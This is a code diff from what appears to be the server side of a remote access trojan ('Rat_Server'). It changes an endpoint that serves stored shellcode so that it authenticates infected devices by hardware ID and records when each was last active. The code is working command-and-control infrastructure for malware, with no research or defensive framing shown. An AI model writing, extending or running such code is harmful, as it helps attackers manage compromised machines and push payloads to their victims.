@@ -22,8 +22,19 @@ namespace Rat_Server.Controllers
         }
 
         [HttpGet("GetShellCode/{Name}")]
-        public async Task<ActionResult> GetShellCode(string Name)
+        public async Task<ActionResult> GetShellCode([FromHeader] Guid Hwid, string Name)
         {
+            Device? device = await _context.Devices.SingleOrDefaultAsync(d => d.Hwid == Hwid);
+            if (device == null)
+            {
+                return Unauthorized();
+            }
+            else
+            {
+                device.LastActive = DateTime.Now;
+                await _context.SaveChangesAsync();
+            }
+
             ShellCode? shellCode = await _context.ShellCodes.SingleOrDefaultAsync(shellCode => shellCode.Name == Name);
             if (shellCode == null)
             {
